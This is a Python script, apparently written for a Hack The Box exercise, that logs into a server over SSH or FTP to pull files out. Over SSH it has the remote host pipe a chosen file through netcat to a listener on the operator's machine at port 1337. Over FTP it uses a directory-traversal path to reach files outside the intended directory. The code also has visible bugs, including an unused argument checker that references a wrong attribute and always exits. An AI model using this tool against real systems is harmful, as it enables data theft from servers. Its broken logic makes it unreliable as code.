#!/bin/python3
'''
it is a script that suppose to run in a Linux System. otherwise, it won't run properly! 
you can try it in windows and see yourself how fucked up this script is for windows.
'''
import pexpect
import argparse
import re
import ntpath
import os

parser = argparse.ArgumentParser(description="only for educational purpose!\n Our program use 1337 port. so, please make sure that you must not have any other service running on this port.")
parser.add_argument("-P","--protocol",help="choose SSH or FTP", type=str, required=True)
parser.add_argument("-u", "--username", help="username on the choosen port", required=True)
parser.add_argument("-p", "--password", help="For password", required=True)
parser.add_argument("-i", "--serverip", help="for IP or domain", required=False)
parser.add_argument("-I", "--myip", help="your IP on which you will recive file", required=True)
parser.add_argument("-f","--filename", help="the file path you want to download from SSH/FTP", type=str)
args = parser.parse_args()

def args_checker():
    if len(args.protocol) == 0:
        print("Please use all argunments")
        exit(0)
    elif len(args.myip) == 0:
        print("Please use all argunments")
        exit(0)
    elif  len(args.username) == 0:
        print("Please use all argunments")
        exit(0)
    elif len(args.password) == 0:
        print("Please use all argunments")
        exit(0)
    elif len(args.filename) == 0:
        print("Please use all argunments")
        exit(0)
    elif len(args.server_ip) == 0:
        print("Please use all argunments")
        exit(0)
    else:
        print("\nsome thing went wrong!")    
        exit(0)
username = args.username
Pass = args.password
server_ip = args.serverip
wants_to_download_file = args.filename
d_file = ntpath.basename(wants_to_download_file)



def ssh_connector():
    first_expect = f"{username}@{server_ip}'s password:"
    child = pexpect.spawn(f"ssh {username}@{server_ip}")
    child.expect(first_expect)
    child.sendline(Pass)
    i = child.expect([username, "Permission denied, please try again."])
    if i == 0:
        try:
            child.sendline(f"nc {args.myip} 1337 < {wants_to_download_file} ")
        except:
                print("Netcat didn't worked. trying scp...\n")
                child2 = pexpect.spawn(f"scp {username}@{server_ip}:{wants_to_download_file} {os.system('pwd')}")
                i2 = child2.expect([username, "Permission denied, please try again."])
                if i2 == 0:
                    child2.sendline(Pass)
                    child2.expect(username)
                    child2.close()
                elif i2 == 1:
                    print("Something went wrong!")
                    exit(0)
    elif i == 1:
        print("Given info. was not correct!")
        child.kill(0)
        exit(0)

def ftp_connector():
    child = pexpect.spawn("ftp")
    child.expect("ftp>")
    child.sendline(f"open {server_ip}") # for testing HTB fatty FTP: 10.10.10.174
    i = child.expect(["220", "refused"])
    if i == 0:
        print("[+] server is ONLINE")
        child.sendline(username)
        child.expect("Password")
        child.sendline(Pass)
        j = child.expect(["230","530"])
        if j == 0:    
            print("You have logged in successfully")
            child.sendline(f"cd ../../../../../../../../../../../../..{os.path.dirname(wants_to_download_file)}")
            child.expect("250")
            child.sendline(f"get {d_file}")
            child.expect("ftp>")
            child.sendline("bye")
        elif j == 1:
            print("creds are incorrect!")
            exit(0)
    elif i == 1:
        print("You are doing something wrong!\n")
        exit(0)

if args.protocol == "ssh":
    print(f"Grabbing file {d_file} from SSH...\n")
    os.system(f"nc -lvp 1337 >{d_file} &>/dev/null &")
    ssh_connector()
    
elif args.protocol == "ftp":
    print(f"Grabbing file {d_file} from FTP...\n")
    ftp_connector()
else:
    print("Wrong protocol\n Choose from [ftp/ssh]")
